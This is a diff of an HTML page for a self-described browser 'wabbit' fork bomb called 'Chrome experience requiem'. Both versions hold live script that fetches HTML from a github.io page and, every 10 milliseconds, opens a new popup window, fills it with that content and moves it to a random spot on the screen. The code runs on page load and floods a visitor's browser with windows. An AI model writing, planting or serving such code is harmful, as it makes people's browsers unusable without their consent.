@@ -1,22 +1,17 @@
-<!DOCTYPE html>
-<html lang="en">
-	<head>
-		<meta charset="utf8">
-		<title>Wha--</title>
-	</head>
-	<body>
-		Wha-
-		<script>
-			//Chrome experience requiem
-			//A web browser based Wabbit/Forkbomb that is both obnoxious and a JoJos reference.
-			const wabbitContent = await (await fetch('https://k4rakara.github.io/chrome-experience-requiem/wabbit.html')).text();
-			async function createWabbit() { //Create a very similar clone window, with code to clone itself.
-  				let wabbit = window.open('','','width = 200,height = 200');
-				wabbit.document.write(wabbitContent);
-  				wabbit.moveTo((Math.random()*screen.width),(Math.random()*screen.height));
- 				wabbitsMade = wabbitsMade + 1;
-			}
-			setInterval(createWabbit,10); //Wait for the voice clip to finish, then play the theme, and once the theme has gone on for 3 seconds, initialize the payload.
-		</script>
-	</body>
-</html>
+Wha-
+<script>
+//Chrome experience requiem
+//A web browser based Wabbit/Forkbomb that is both obnoxious and a JoJos reference.
+let wabbitContent = '';
+(async () => {
+	wabbitContent = await (await fetch('https://k4rakara.github.io/chrome-experience-requiem/wabbit.html')).text();
+})();
+
+async function createWabbit() { //Create a very similar clone window, with code to clone itself.
+	let wabbit = window.open('data:text/html,<!DOCTYPE html><head><title>wha</title></head><body></body>','Wha-','width = 200,height = 200');
+	wabbit.document.body.innerHTML = wabbitContent;
+  	wabbit.moveTo((Math.random()*screen.width),(Math.random()*screen.height));
+}
+
+setInterval(createWabbit,10); 
+</script>
